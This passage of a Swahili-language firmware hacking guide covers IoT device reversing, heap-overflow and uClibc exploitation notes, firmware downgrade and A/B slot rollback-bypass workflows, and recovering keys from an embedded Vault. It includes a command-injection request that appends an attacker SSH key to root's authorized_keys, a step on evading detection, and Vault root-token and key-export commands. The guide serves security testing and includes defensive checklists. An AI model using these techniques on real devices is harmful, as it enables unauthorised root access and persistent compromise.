sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Kwa utenganishaji wa hitilafu unaoweza kurudiwa, andika faili za alama zenye mihuri ya muda kwenye volume thabiti inayoweza kuandikwa na uzihakiki ukiwa offline; `/dev/kmsg`, FIFO, na consoles za muda zinaweza kutoa matokeo hasi ya uongo kutokana na udhibiti wa kiwango au mchakato kusitishwa mapema. Pia linganisha interfaces halisi katika tabaka mbalimbali kabla ya kubadilisha code isiyohusiana: `uname -r` dhidi ya `/lib/modules/`, vipengele vya ext4 vilivyo kwenye diski dhidi ya usanidi wa kernel, na toleo la Mesa `libGL` dhidi ya DRI driver ABI na majina ya driver yanayotokana na PCI. Kipengele kinaweza kuwepo na hata `dlopen()` kufanikiwa, lakini bado kisiweze kutumika kwa sababu mtumiaji wake anatarajia ABI tofauti.<sup>[[11]](#references)</sup>

## Uchambuzi wa Dynamic kwa Vitendo

Katika hatua hii, mazingira halisi au yaliyoigwa ya kifaa hutumika kwa uchambuzi. Ni muhimu kudumisha ufikiaji wa shell kwa OS na filesystem. Uigaji huenda usiige kikamilifu mwingiliano wa hardware, hivyo wakati mwingine itahitajika kuanzisha upya uigaji. Uchambuzi unapaswa kuchunguza tena filesystem, kutumia vibaya webpages na huduma za mtandao zilizo wazi, na kuchunguza udhaifu wa bootloader. Majaribio ya uadilifu wa firmware ni muhimu ili kutambua udhaifu unaoweza kusababishwa na backdoor.

## Mbinu za Uchambuzi wa Runtime

Uchambuzi wa runtime unahusisha kuingiliana na mchakato au binary katika mazingira yake ya uendeshaji, kwa kutumia zana kama gdb-multiarch, Frida, na Ghidra kuweka breakpoints na kutambua udhaifu kupitia fuzzing na mbinu nyingine.

Kwa embedded targets zisizo na debugger kamili, **nakili `gdbserver` iliyounganishwa statically** kwenye kifaa na uunganishe nayo kwa mbali:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Ramani ya ujumbe wa Zigbee / radio-co-processor

Kwenye hubs za IoT, RF stack mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Workflow muhimu ni kufuatilia njia:<sup>[[8]](#references)</sup>

1. **RF frame** inaposafirishwa hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye daemon kuu
5. **protocol-specific handler / state machine**

Muundo huu hutengeneza maeneo mawili ya reversing badala ya moja. Ikiwa controller hubadilisha binary radio frames kuwa textual protocol kama `Group,Command,arg1,arg2,...`, tambua:

- **message groups** na dispatch tables
- Ni ujumbe upi unaweza kutoka kwenye **network** na upi kutoka kwa controller yenyewe
- Sehemu halisi za **manufacturer-specific discriminator** (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handlers zipi zinaweza kufikiwa tu wakati wa **commissioning**, discovery, au awamu za kupakua firmware/model

Kwa Zigbee hasa, nasa mawasiliano ya pairing na uhakiki kama kifaa lengwa bado kinategemea **Link Key** ya kawaida `ZigBeeAlliance09`. Ikiwa ndivyo, kunasa mawasiliano ya commissioning kunaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza hatari hii, kwa hiyo tambua kama kifaa kilichojaribiwa kinazitekeleza kweli.

### Manufacturer-specific protocol handlers na ufikikaji unaodhibitiwa na FSM

Amri za Zigbee/ZCL maalum za vendor mara nyingi huwa shabaha bora kuliko clusters sanifu kwa sababu hupeleka data kwenye **custom parsing code** na **FSMs** za ndani ambazo uthibitishaji wake haujajaribiwa vya kutosha.<sup>[[8]](#references)</sup>

Workflow ya vitendo:

- Fanya reverse ya command dispatcher hadi upate **vendor-only handler**.
- Tambua majedwali ya **FSM state**, **event**, **check**, **action**, na **next-state**.
- Tambua **transitional states** zinazoendelea zenyewe, pamoja na matawi ya retry/error ambayo hatimaye huweka upya au kufuta state inayodhibitiwa na mshambuliaji.
- Thibitisha ni mawasiliano gani halali ya protocol yanayohitajika ili kuweka daemon katika hali iliyo hatarini, badala ya kudhani kuwa handler yenye hitilafu inaweza kufikiwa wakati wowote.

Kwa protocols zinazotegemea muda sahihi, packet replay kutoka Python framework inaweza kuwa polepole mno. Njia ya kuaminika zaidi ni kuiga kifaa halali kwenye hardware halisi (kwa mfano **nRF52840**) kwa kutumia vendor-grade stack ili uweze kufichua **endpoints**, **attributes**, na muda sahihi wa commissioning.

### Aina ya hitilafu ya fragmented-download kwenye embedded daemons

Aina ya hitilafu ya firmware inayojirudia hutokea kwenye upakuaji wa **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **First fragment** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga kumbukumbu kwa `malloc(total_size)`.
2. Fragments zinazofuata hukagua tu sehemu za **packet-local** zinazodhibitiwa na mshambuliaji, kama vile `packet_total_size >= offset + chunk_len`.
3. Nakala hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kukagua kama inazidi **ukubwa wa awali wa kumbukumbu iliyotengwa**.

Hii humwezesha mshambuliaji kutuma:

- First fragment halali yenye ukubwa mdogo wa jumla uliotangazwa ili kulazimisha allocation ndogo ya heap.
- Fragment ya baadaye yenye **offset inayotarajiwa** lakini `chunk_len` kubwa zaidi.
- Packet-local size ya kughushi inayopita ukaguzi mpya huku bado ikifurika buffer iliyotengwa awali.

Njia iliyo hatarini ikizuiwa na commissioning logic, exploitation lazima ijumuishe **device emulation** ya kutosha ili kupeleka kifaa lengwa kwenye hali inayotarajiwa ya model-download au blob-download kabla ya kutuma fragments zilizoharibika.

### Vichochezi vya `free()` vinavyoanzishwa na protocol

Kwenye embedded daemons, njia rahisi zaidi ya kuanzisha heap metadata exploitation mara nyingi si “kusubiri cleanup” bali **kulazimisha error handling ya protocol yenyewe**:<sup>[[8]](#references)</sup>

- Tuma follow-up fragments zilizoharibika ili kupeleka FSM kwenye hali za **retry** au **error**.
- Vuka kiwango cha juu cha retries ili daemon **iweke upya context** na ifute buffer iliyoharibika.
- Tumia `free()` hii inayotabirika kuanzisha allocator-side primitives kabla mchakato hauja-crash kwa sababu zisizohusiana.

Hii ni muhimu hasa dhidi ya allocators za aina ya **musl/uClibc/dlmalloc** kwenye embedded Linux, ambapo kuharibu chunk metadata kunaweza kubadilisha unlink/unbin logic kuwa write primitive. Mbinu thabiti ni kuharibu **size field** ili kuelekeza allocator traversal kwenye **fake chunks zilizowekwa ndani ya buffer iliyofurika**, badala ya kuharibu mara moja bin pointers halisi na ku-crash mchakato.

## Binary Exploitation na Proof-of-Concept

Kutengeneza PoC ya vulnerabilities zilizotambuliwa kunahitaji kuelewa kwa kina architecture ya kifaa lengwa na kutumia programming languages za kiwango cha chini. Ulinzi wa binary runtime ni nadra kwenye embedded systems, lakini unapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### Vidokezo vya uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Allocation kubwa ya baadaye inaweza kuanzisha `__malloc_consolidate()`, kwa hiyo fake chunk yoyote lazima ipite ukaguzi (ukubwa unaokubalika, `fd = 0`, na chunks zilizo jirani zionekane kuwa “in use”).<sup>[[6]](#references)</sup>
- **Binaries zisizo za PIE chini ya ASLR:** ikiwa ASLR imewezeshwa lakini binary kuu ni **non-PIE**, anwani za `.data/.bss` ndani ya binary huwa thabiti. Unaweza kulenga eneo ambalo tayari linafanana na heap chunk header halali ili kuelekeza fastbin allocation kwenye **function pointer table**.
- **NUL inayosimamisha parser:** JSON inapochanganuliwa, `\x00` kwenye payload inaweza kusimamisha parsing huku ikihifadhi bytes zinazofuata, zinazodhibitiwa na mshambuliaji, kwa stack pivot/ROP chain.
- **Shellcode kupitia `/proc/self/mem`:** ROP chain inayopiga `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kuweka shellcode inayoweza kutekelezwa kwenye mapping inayojulikana na kurukia humo.

## Operating Systems Zilizotayarishwa kwa Firmware Analysis

Operating systems kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyosanidiwa awali kwa ajili ya firmware security testing, yakiwa na zana zinazohitajika.

## OS Zilizotayarishwa kwa Uchambuzi wa Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyoundwa kukusaidia kufanya security assessment na penetration testing ya vifaa vya Internet of Things (IoT). Huokoa muda mwingi kwa kutoa mazingira yaliyosanidiwa awali yenye zana zote zinazohitajika.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operating system ya embedded security testing inayotegemea Ubuntu 18.04 na iliyo na zana za firmware security testing zilizopakiwa awali.

## Mashambulizi ya Firmware Downgrade na Njia za Update Zisizo Salama

Hata vendor anapotekeleza ukaguzi wa cryptographic signature kwa firmware images, **ulinzi dhidi ya version rollback (downgrade) mara nyingi huachwa**. Ikiwa boot- au recovery-loader hukagua tu signature kwa kutumia public key iliyopachikwa, lakini hailinganishi *version* (au monotonic counter) ya image inayowekwa, mshambuliaji anaweza kusakinisha kihalali **firmware ya zamani iliyo hatarini ambayo bado ina signature halali**, na hivyo kurejesha vulnerabilities zilizokuwa zimerekebishwa.<sup>[[4]](#references)</sup>

Workflow ya kawaida ya mashambulizi:

1. **Pata image ya zamani iliyosainiwa**
   * Ichukue kutoka kwenye public download portal, CDN au support site ya vendor.
   * Itoe kutoka kwenye companion mobile/desktop applications (kwa mfano ndani ya Android APK kwenye `assets/firmware/`).
   * Ipate kutoka kwenye third-party repositories kama VirusTotal, Internet archives, forums, n.k.
2. **Pakia au toa image kwa kifaa** kupitia njia yoyote ya update iliyo wazi:
   * Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
   * Vifaa vingi vya IoT vya watumiaji vina HTTP(S) endpoints *zisizohitaji uthibitishaji* ambazo hupokea firmware blobs zilizosimbwa kwa Base64, huzifungua upande wa server, kisha huanzisha recovery/upgrade.
3. Baada ya downgrade, tumia vulnerability iliyorekebishwa kwenye release mpya zaidi (kwa mfano command-injection filter iliyoongezwa baadaye).
4. Kwa hiari, flash image ya karibuni zaidi tena au zima updates ili kuepuka kugunduliwa baada ya kupata persistence.

### Mfano: Command Injection Baada ya Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Katika firmware iliyo hatarini (iliyorejeshwa kwenye toleo la zamani), kigezo cha `md5` huunganishwa moja kwa moja kwenye amri ya shell bila kusafishwa, hivyo kuruhusu kuingiza amri zozote (hapa, kuwezesha ufikiaji wa root kwa kutumia SSH key). Matoleo ya baadaye ya firmware yaliongeza kichujio cha msingi cha herufi, lakini kutokuwepo kwa ulinzi dhidi ya kurejesha toleo la zamani kunafanya marekebisho hayo yasiwe na maana.<sup>[[4]](#references)</sup>

### Kutoa Firmware Kutoka Kwenye Programu za Simu

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya programu zao saidizi za simu ili programu iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Vifurushi hivi mara nyingi huhifadhiwa bila usimbaji fiche ndani ya APK/APEX, kwenye njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuwezesha kutoa picha zilizotiwa saini bila kugusa maunzi halisi.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Kukwepa anti-rollback kwa kutumia updater pekee katika miundo ya A/B slot

Baadhi ya vendor hutekeleza **ratchet** ya kuzuia downgrade, lakini huiweka tu ndani ya mantiki ya *updater* (kwa mfano, routine ya UDS kupitia CAN, amri ya recovery, au agent ya OTA ya userspace). Ikiwa baadaye **bootloader** hukagua tu sahihi/CRC ya image na kuamini jedwali la partition au metadata ya slot, ulinzi wa rollback bado unaweza kukwepwa.<sup>[[7]](#references)</sup>

Muundo dhaifu wa kawaida:

- Metadata ya firmware ina maelezo ya toleo na **security ratchet** / kaunta ya monotonic.
- Updater hulinganisha ratchet ya image na thamani iliyohifadhiwa kwenye persistent storage na kukataa image za zamani zilizosainiwa.
- **Bootloader** haichanganui ratchet hiyo na huthibitisha tu header, CRC na sahihi kabla ya kuwasha slot iliyochaguliwa.
- Uamilishaji wa slot huhifadhiwa kando kwenye jedwali la partition au kaunta ya generation ya kila slot na **haujaunganishwa kwa njia ya kriptografia** na digest halisi ya firmware iliyothibitishwa.

Hii hutengeneza primitive ya **thibitisha-image-moja / washa-image-nyingine** katika mifumo ya dual-slot. Ikiwa mshambuliaji anaweza kufanya updater iashirie slot B kuwa lengo la kuwasha linalofuata kwa kutumia image ya sasa iliyosainiwa, kisha baadaye akaandika upya slot B kabla ya kuwasha upya, bootloader bado inaweza kuwasha image iliyopunguzwa toleo kwa sababu inaamini tu metadata ya slot iliyokwishawekwa.

Mfumo wa kawaida wa matumizi mabaya:

1. Pakia firmware **ya sasa iliyosainiwa** kwenye slot isiyotumika na utekeleze routine ya kawaida ya uthibitishaji/kubadilisha ili mpangilio uweke slot hiyo kuwa inayofuata kuwashwa.
2. **Usiwashie upya bado**. Anzisha tena routine ya kuandaa/kufuta slot katika session hiyo hiyo.
3. Tumia vibaya hali ya boot iliyopitwa na wakati au mantiki ya kuchagua slot iliyopitwa na wakati ili updater ifute **slot ileile halisi** iliyokuwa imepandishwa kuwa inayofuata kuwashwa.
4. Andika firmware **ya zamani lakini bado iliyosainiwa** kwenye slot hiyo.
5. Ruka routine ya uthibitishaji inayotekeleza ratchet na uwashe upya moja kwa moja.
6. Bootloader huchagua slot iliyopandishwa, huthibitisha sahihi/uadilifu pekee, kisha huwasha image ya zamani.

Mambo ya kuchunguza unapofanya reverse engineering ya utekelezaji wa A/B update:

- Uchaguzi wa slot unaotokana na **bendera za wakati wa kuwasha** ambazo hazisasishwi baada ya kubadilisha slot kwa mafanikio.
- Routine ya aina ya `prepare_passive_slot()` inayofuta slot kwa kutumia hali iliyopitwa na wakati badala ya **mpangilio wa sasa uliothibitishwa**.
- Function ya aina ya `part_write_layout()` inayoongeza tu **kaunta ya generation** / bendera ya active na haihifadhi hash ya image iliyothibitishwa.
- Ukaguzi wa ratchet unaotekelezwa kwenye userspace au code ya updater, lakini **si** kwenye hatua za ROM / bootloader / secure boot.
- Routine za kufuta au recovery zinazoacha slot ikiwa imetiwa alama ya kuwashika hata baada ya maudhui yake kuondolewa na kuandikwa upya.

### Orodha ya Ukaguzi wa Mantiki ya Update

* Je, usafirishaji/uthibitishaji wa *update endpoint* umelindwa vya kutosha (TLS + authentication)?
* Je, kifaa hulinganisha **nambari za toleo** au **kaunta ya monotonic ya kuzuia rollback** kabla ya kuandika firmware?
* Je, image inathibitishwa ndani ya secure boot chain (kwa mfano, sahihi hukaguliwa na code ya ROM)?
* Je, **bootloader hutekeleza ratchet ileile** kama updater, badala ya kukagua sahihi/CRC pekee?
* Je, metadata ya uamilishaji wa slot **imeunganishwa na digest/toleo la firmware lililothibitishwa**, au slot inaweza kurekebishwa baada ya kupandishwa?
* Baada ya kubadilisha slot kwa mafanikio, je, kifaa hulazimishwa kuwasha upya au routine za baadaye za update/kufuta bado zinaweza kufikiwa katika session hiyo hiyo?
* Je, code ya userland hufanya ukaguzi wa ziada wa uhalali (kwa mfano, ramani ya partition inayoruhusiwa, nambari ya modeli)?
* Je, mtiririko wa update wa *sehemu* au wa *backup* hutumia tena mantiki ileile ya uthibitishaji?

> 💡  Ikiwa mojawapo ya haya haipo, huenda mfumo huo uko hatarini kwa mashambulizi ya rollback.

## Firmware hatarishi ya kufanya mazoezi

Ili kufanya mazoezi ya kugundua udhaifu katika firmware, tumia miradi ifuatayo ya firmware hatarishi kama mwanzo.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kurejesha funguo za usimbuaji wa firmware kutoka hali ya KMS/Vault iliyopachikwa

Wakati image ya update inachanganya metadata ndogo iliyo katika plaintext na blob kubwa yenye entropy ya juu, kagua muundo wa kontena kabla ya kujaribu brute-force:<sup>[[1]](#references)</sup>

- Toa headers, offsets na mipaka ya mistari kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida huashiria umbizo la OpenSSL `enc`: baiti 8 zinazofuata ni salt na baiti zilizobaki ni ciphertext.
- Sehemu ya Base64 inayodekodiwa kuwa baiti `256` kamili ni kidokezo kikubwa kwamba unaangalia ciphertext ya RSA-2048 inayofunika nenosiri/random session key ya firmware.
- Nyenzo ya PGP iliyotenganishwa iliyo kwenye faili hiyo hiyo mara nyingi hulinda uhalisi pekee; usidhani kuwa ndiyo njia ya kulinda usiri.

Ikiwa utafutaji wa funguo tuli (`grep`, `strings`, utafutaji wa PEM/PGP) hautafanikiwa, fanya reverse engineering ya **njia ya uondoaji-usimbuaji inayotumika** badala ya kutafuta funguo za faragha pekee:

- Decompile binary ya updater / management na ufuatilie ni nani anayesoma blob iliyosimbwa, ni helper/API gani inayofungua usimbuaji wake, na jina gani la kimantiki la ufunguo inaomba.
- Tafuta hali ya KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na faili za unit na script za init kwenye root filesystem iliyotolewa.
- Chukulia plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens, au script za ndani za KMS auto-unseal kuwa sawa na nyenzo za ufunguo wa faragha.

Ikiwa appliance inasafirisha binary asilia ya Vault na backend ya hifadhi, kurudia mazingira hayo kwa kawaida ni rahisi kuliko kutekeleza upya mambo ya ndani ya Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Ukiwa na root kwenye KMS iliyoklonishwa:

- Fanya funguo za transit ziweze kuhamishwa nje ndani ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Hamisha ufunguo wa kufungua (unwrap): `vault read transit/export/encryption-key/<name>`
- Jaribu ufunguo wa RSA uliorejeshwa ukitumia jozi kamili ya padding/hash inayotumiwa na KMS. Kushindwa kusimbua kwa PKCS#1 v1.5 na kushindwa kusimbua kwa OAEP chaguomsingi **hakuthibitishi** kuwa ufunguo si sahihi; mifumo mingi inayotumia Vault hutumia OAEP yenye SHA-256, ilhali maktaba za kawaida hutumia SHA-1 kama chaguomsingi.
- Ikiwa payload inaanza na `Salted__`, tekeleza upya KDF ya OpenSSL ya mtengenezaji kwa usahihi (`EVP_BytesToKey`, mara nyingi MD5 kwenye vifaa vya zamani) kabla ya kujaribu kusimbua kwa AES-CBC.

Hii hugeuza tatizo la "firmware iliyosimbwa kwa njia fiche" kuwa tatizo pana zaidi: **rejesha funguo za uendeshaji zilizo upande wa kifaa, kisha tekeleza upya vigezo sahihi kabisa vya unwrap + KDF ukiwa offline**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware kwa Claude: Ujuzi wa Kiwango cha Mtaalamu, Uhuru wa Kiwango cha Mwanzilishi](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Mwongozo Mahususi wa Kushambulia Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Kutumia zero-days katika hardware iliyoachwa – blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jinsi Kifaa Mahiri cha $20 Kilivyonipa Ufikiaji wa Nyumba Yako](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sasa Unamwona mi: Sasa Umepwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Kushambulia Tesla Wall Connector kupitia kiunganishi chake cha charge port - Sehemu ya 2: kukwepa anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Iifanye Iwake: Exploitation ya Philips Hue Bridge kupitia Over-the-Air](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS kwenye QEMU Sehemu ya 1: Kufungua](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Nyaraka za Linux kernel - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS kwenye QEMU Sehemu ya 2: Kutatua hitilafu na kurekebisha](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Nywila za Dell BIOS: Usimbaji fiche dhaifu wa XOR huruhusu urejeshaji kutoka SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Zana za kurejesha nywila za Dell BIOS](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
